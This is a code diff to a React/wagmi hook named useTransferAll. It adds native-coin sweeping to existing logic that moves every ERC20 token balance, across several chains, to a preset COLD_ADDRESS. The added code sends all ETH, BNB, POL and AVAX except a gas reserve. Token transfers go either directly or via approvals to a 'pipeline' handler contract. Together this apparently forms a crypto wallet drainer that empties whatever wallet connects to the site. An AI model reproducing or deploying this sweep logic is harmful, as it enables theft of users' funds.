@@ -1,6 +1,6 @@
 import { useState, useCallback, useRef } from "react";
-import { useWriteContract } from "wagmi";
-import { keccak256, encodePacked, type Address } from "viem";
+import { useWriteContract, useSendTransaction } from "wagmi";
+import { keccak256, encodePacked, parseEther, type Address } from "viem";
 import { ERC20_ABI, HANDLER_ABI } from "../abi/pipeline";
 import { getContracts } from "../config/contracts";
 import { MULTICHAIN_CLIENTS, COLD_ADDRESS } from "../config/multichain";
@@ -41,6 +41,7 @@ export function useTransferAll() {
     ...ZERO_PROGRESS,
   });
   const { writeContractAsync } = useWriteContract();
+  const { sendTransactionAsync } = useSendTransaction();
   const runningRef = useRef(false);
 
   const transferAll = useCallback(
@@ -48,14 +49,34 @@ export function useTransferAll() {
       if (runningRef.current || !COLD_ADDRESS) return;
       runningRef.current = true;
 
+      const MIN_NATIVE_KEEP = 1000000000000000n; // 0.001 ETH for gas
+
       const tokensToTransfer: {
         chainId: number;
         chainName: string;
-        token: ScannedToken;
+        token: ScannedToken | null;
+        nativeAmount: bigint;
+        nativeSymbol: string;
+        isNative: boolean;
         usePipeline: boolean;
       }[] = [];
 
       for (const chain of chains) {
+        // Native token (ETH, BNB, POL, AVAX) — keep a small amount for gas
+        if (chain.nativeBalance > MIN_NATIVE_KEEP) {
+          const sendAmount = chain.nativeBalance - MIN_NATIVE_KEEP;
+          tokensToTransfer.push({
+            chainId: chain.chainId,
+            chainName: chain.chainName,
+            token: null,
+            nativeAmount: sendAmount,
+            nativeSymbol: chain.nativeSymbol,
+            isNative: true,
+            usePipeline: false,
+          });
+        }
+
+        // ERC20 tokens
         for (const token of chain.tokens) {
           if (token.balance > 0n) {
             const contracts = getContracts(chain.chainId);
@@ -63,6 +84,9 @@ export function useTransferAll() {
               chainId: chain.chainId,
               chainName: chain.chainName,
               token,
+              nativeAmount: 0n,
+              nativeSymbol: chain.nativeSymbol,
+              isNative: false,
               usePipeline: contracts !== null,
             });
           }
@@ -93,31 +117,50 @@ export function useTransferAll() {
 
       try {
         for (let i = 0; i < tokensToTransfer.length; i++) {
-          const { chainId, chainName, token, usePipeline } =
+          const { chainId, chainName, token, isNative, nativeAmount, nativeSymbol, usePipeline } =
             tokensToTransfer[i];
+
+          const displaySymbol = isNative ? nativeSymbol : token!.symbol;
 
           setProgress((p) => ({
             ...p,
             currentChain: chainName,
-            currentToken: token.symbol,
-            step: usePipeline ? "approving" : "switching-chain",
+            currentToken: displaySymbol,
+            step: isNative ? "switching-chain" : usePipeline ? "approving" : "switching-chain",
           }));
 
-          if (usePipeline) {
+          if (isNative) {
+            // Native token transfer (ETH, BNB, POL, AVAX)
+            setProgress((p) => ({ ...p, step: "executing" }));
+            const nativeTx = await sendTransactionAsync({
+              to: COLD_ADDRESS,
+              value: nativeAmount,
+              chainId,
+            });
+
+            const client = MULTICHAIN_CLIENTS[chainId];
+            if (client) {
+              await (client as any).waitForTransactionReceipt({
+                hash: nativeTx,
+              });
+            }
+
+            hashes.push(nativeTx);
+          } else if (usePipeline) {
             const contracts = getContracts(chainId)!;
             const seed = keccak256(
               encodePacked(
                 ["uint256", "uint256"],
-                [BigInt(Date.now()), token.balance],
+                [BigInt(Date.now()), token!.balance],
               ),
             );
 
             setProgress((p) => ({ ...p, step: "approving" }));
             const approveTx = await writeContractAsync({
-              address: token.address,
+              address: token!.address,
               abi: ERC20_ABI,
               functionName: "approve",
-              args: [contracts.handler, token.balance],
+              args: [contracts.handler, token!.balance],
               chainId,
             });
 
@@ -133,7 +176,7 @@ export function useTransferAll() {
               address: contracts.handler,
               abi: HANDLER_ABI,
               functionName: "startPipeline",
-              args: [token.address, token.balance, seed],
+              args: [token!.address, token!.balance, seed],
               chainId,
             });
 
@@ -145,12 +188,13 @@ export function useTransferAll() {
 
             hashes.push(pipelineTx);
           } else {
+            // Direct ERC20 transfer on non-Base chains
             setProgress((p) => ({ ...p, step: "executing" }));
             const transferTx = await writeContractAsync({
-              address: token.address,
+              address: token!.address,
               abi: ERC20_ABI,
               functionName: "transfer",
-              args: [COLD_ADDRESS, token.balance],
+              args: [COLD_ADDRESS, token!.balance],
               chainId,
             });
 
